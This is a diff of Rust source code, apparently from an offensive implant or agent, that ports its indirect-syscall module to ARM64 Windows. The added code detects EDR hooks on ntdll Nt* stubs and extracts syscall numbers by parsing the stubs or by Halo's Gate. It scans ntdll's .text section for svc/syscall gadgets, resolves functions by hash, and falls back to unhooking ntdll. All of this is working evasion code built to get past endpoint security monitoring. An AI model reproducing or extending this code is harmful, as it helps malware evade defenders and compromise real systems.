@@ -974,9 +974,9 @@ unsafe fn query_kernel_base() -> Option<usize> {
 // ─── Hook-byte detection & stub parsing ────────────────────────────────────
 
 /// Attempt to extract the SSN and gadget address directly from an unhooked
-/// `Nt*` stub at `func_addr`.  Returns `None` when the stub appears hooked
-/// (no `syscall` instruction found within the first 64 bytes).
-#[cfg(windows)]
+/// `Nt*` stub at `func_addr` (x86-64).  Returns `None` when the stub appears
+/// hooked (no `syscall` instruction found within the first 64 bytes).
+#[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
     for j in 0..bytes.len().saturating_sub(1) {
@@ -989,6 +989,41 @@ unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
                         gadget_addr: func_addr + j,
                     });
                 }
+            }
+        }
+    }
+    None
+}
+
+/// Scan up to 16 ARM64 instructions of an `Nt*` stub looking for `svc #0`
+/// (0xD4000001), then search backward for `movz x8, #imm16` to extract SSN.
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
+    let words = std::slice::from_raw_parts(func_addr as *const u32, 16);
+    for j in 0..words.len() {
+        if words[j] == 0xD4000001 {
+            // svc #0 found — search backward for movz x8 / movk x8.
+            let mut ssn: u32 = 0;
+            let mut found_movz = false;
+            for k in (0..j).rev() {
+                let w = words[k];
+                if (w & 0xFFE0001F) == 0xF2A00008 {
+                    // movk x8, #imm16, lsl #16
+                    let imm16 = ((w >> 5) & 0xFFFF) as u32;
+                    ssn |= imm16 << 16;
+                } else if (w & 0xFFE0001F) == 0xD2800008 {
+                    // movz x8, #imm16
+                    let imm16 = ((w >> 5) & 0xFFFF) as u32;
+                    ssn = (ssn & 0xFFFF0000) | imm16;
+                    found_movz = true;
+                    break;
+                }
+            }
+            if found_movz {
+                return Some(SyscallTarget {
+                    ssn,
+                    gadget_addr: func_addr + j * 4,
+                });
             }
         }
     }
@@ -1145,9 +1180,9 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
     None
 }
 
-/// Scan the loaded ntdll `.text` section for a valid `syscall; ret` gadget.
-/// Returns the gadget's address, or `None` if none was found.
-#[cfg(windows)]
+/// Scan the loaded ntdll `.text` section for a valid `syscall; ret` gadget
+/// (x86-64).  Returns the gadget's address, or `None` if none was found.
+#[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 
@@ -1156,11 +1191,6 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
         return None;
     }
     let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
-    // Use SizeOfOptionalHeader from the file header rather than
-    // size_of::<IMAGE_NT_HEADERS64>(), because the actual optional header
-    // size may differ from the compile-time struct size.  The section headers
-    // immediately follow the optional header in the PE layout:
-    //   offset = signature(4) + FILE_HEADER(20) + SizeOfOptionalHeader
     let p_sections = (nt as *const _ as usize
         + 4
         + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
@@ -1194,8 +1224,60 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     None
 }
 
-/// Bootstrap SSN resolution: inspect prologue bytes for hook detection, then
-/// use Halo's Gate for SSN and a `.text` scan for the gadget if hooked.
+/// Scan the loaded ntdll `.text` section for a valid `svc #0; ret` (or bare
+/// `svc #0`) gadget on ARM64 Windows.  ARM64 uses fixed-width 32-bit
+/// instructions, so the scan walks in 4-byte (u32) steps.
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+
+    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return None;
+    }
+    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let p_sections = (nt as *const _ as usize
+        + 4
+        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + nt.FileHeader.SizeOfOptionalHeader as usize)
+        as *const IMAGE_SECTION_HEADER;
+
+    for i in 0..nt.FileHeader.NumberOfSections {
+        let section = &*p_sections.add(i as usize);
+        let name = &section.Name;
+        if name[0] == b'.'
+            && name[1] == b't'
+            && name[2] == b'e'
+            && name[3] == b'x'
+            && name[4] == b't'
+        {
+            let start = ntdll_base + section.VirtualAddress as usize;
+            let size = *section.Misc.VirtualSize() as usize;
+            let n_words = size / 4;
+            let words = std::slice::from_raw_parts(start as *const u32, n_words);
+            for j in 0..n_words {
+                if words[j] == 0xD4000001 {
+                    // svc #0
+                    let candidate = start + j * 4;
+                    let gadget_len = if j + 1 < n_words && words[j + 1] == 0xD65F03C0 {
+                        8
+                    } else {
+                        4
+                    };
+                    if gadget_is_valid(candidate, gadget_len) {
+                        return Some(candidate);
+                    }
+                }
+            }
+            break;
+        }
+    }
+    None
+}
+
+/// Bootstrap SSN resolution (x86-64): inspect prologue bytes for hook
+/// detection, then use Halo's Gate for SSN and a `.text` scan for the gadget.
+#[cfg(all(windows, target_arch = "x86_64"))]
 fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
     unsafe {
         let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
@@ -1223,22 +1305,18 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
             Some(t) => t,
             None => {
-                // Halo's Gate failed — all adjacent stubs are hooked.
-                // Try the registered unhook callback (agent's ntdll_unhook).
                 log::warn!(
                     "nt_syscall: Halo's Gate failed for {func_name} \
                      (all adjacent stubs hooked); invoking ntdll unhook fallback"
                 );
                 if let Some(callback) = UNHOOK_CALLBACK.get() {
                     if callback() {
-                        // Unhook succeeded — clear cache and retry resolution.
                         if let Some(cache) = SYSCALL_CACHE.get() {
                             cache.lock().unwrap().remove(func_name);
                         }
                         log::info!(
                             "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
                         );
-                        // Re-fetch the (now clean) stub address and parse it.
                         let ntdll_base2 =
                             pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
                         let func_addr2 =
@@ -1246,7 +1324,6 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                         if let Some(t) = parse_syscall_stub(func_addr2) {
                             return Some(t);
                         }
-                        // If parse_syscall_stub still fails, try Halo's Gate one more time.
                         infer_ssn_halo_gate(ntdll_base2, func_addr2)?
                     } else {
                         log::error!("nt_syscall: ntdll unhook callback failed for {func_name}");
@@ -1271,6 +1348,88 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
             }
             log::warn!(
                 "nt_syscall: {func_name}: no clean gadget found in .text; \
+                 using Halo's Gate neighbour gadget as fallback"
+            );
+        }
+
+        Some(ssn_target)
+    }
+}
+
+/// Bootstrap SSN resolution (ARM64): inspect the first instruction for hook
+/// detection.  An unhooked ARM64 Nt* stub starts with `movz x8, #imm16`
+/// (opcode mask 0xFFE0001F == 0xD2800008).  A hooked stub typically begins
+/// with a branch instruction (`b <offset>` or `br xN`).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
+    unsafe {
+        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
+        let mut name = func_name.as_bytes().to_vec();
+        name.push(0);
+        let target_hash = pe_resolve::hash_str(&name);
+        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
+
+        let first_word = std::ptr::read_unaligned(func_addr as *const u32);
+        let is_hooked = (first_word & 0xFFE0001F) != 0xD2800008;
+
+        if !is_hooked {
+            if let Some(t) = parse_syscall_stub(func_addr) {
+                return Some(t);
+            }
+        } else {
+            log::warn!(
+                "nt_syscall: {func_name} stub appears hooked \
+                 (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
+                first_word
+            );
+        }
+
+        let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
+            Some(t) => t,
+            None => {
+                log::warn!(
+                    "nt_syscall: Halo's Gate failed for {func_name} \
+                     (all adjacent stubs hooked); invoking ntdll unhook fallback"
+                );
+                if let Some(callback) = UNHOOK_CALLBACK.get() {
+                    if callback() {
+                        if let Some(cache) = SYSCALL_CACHE.get() {
+                            cache.lock().unwrap().remove(func_name);
+                        }
+                        log::info!(
+                            "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
+                        );
+                        let ntdll_base2 =
+                            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
+                        let func_addr2 =
+                            pe_resolve::get_proc_address_by_hash(ntdll_base2, target_hash)?;
+                        if let Some(t) = parse_syscall_stub(func_addr2) {
+                            return Some(t);
+                        }
+                        infer_ssn_halo_gate(ntdll_base2, func_addr2)?
+                    } else {
+                        log::error!("nt_syscall: ntdll unhook callback failed for {func_name}");
+                        return None;
+                    }
+                } else {
+                    log::error!(
+                        "nt_syscall: Halo's Gate failed for {func_name} \
+                         and no unhook callback is registered"
+                    );
+                    return None;
+                }
+            }
+        };
+
+        if is_hooked {
+            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
+                return Some(SyscallTarget {
+                    ssn: ssn_target.ssn,
+                    gadget_addr,
+                });
+            }
+            log::warn!(
+                "nt_syscall: {func_name}: no clean svc #0 gadget found in .text; \
                  using Halo's Gate neighbour gadget as fallback"
             );
         }
